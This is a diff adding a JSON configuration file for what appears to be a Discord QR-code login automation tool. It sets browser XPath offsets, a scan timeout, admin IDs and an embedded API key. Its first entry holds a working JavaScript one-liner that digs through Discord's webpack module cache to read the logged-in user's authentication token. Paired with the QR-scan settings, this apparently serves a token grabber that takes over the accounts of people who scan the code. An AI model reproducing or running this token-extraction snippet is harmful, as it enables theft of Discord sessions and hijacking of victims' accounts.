@@ -1,0 +1,11 @@
+{
+  "DiscordGetTokenScript": "(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()",
+  "QrCodeOffset": "/html/body/div[1]/div[2]/div/div[1]/div/div/div/div/form/div/div/div[3]/div/div/div/div[1]/div[1]/img",
+  "AvatarUrlOffset": "/html/body/div[1]/div[2]/div/div[1]/div/div/div/div/form/div/div/div[3]/div/div/div/div[1]/svg/foreignObject/div/img",
+  "HeadlessDriver": false,
+  "QRCodeTimeout": 90,
+  "VelocityApiKey": "QnFNZ21MbnAra2pWaC8veXNkR0JDQT09",
+  "ActiveEmoji": "🟢",
+  "AwaitingEmoji": "🟡",
+  "AdminIds": [813679495508656158, 997182203383529472]
+}
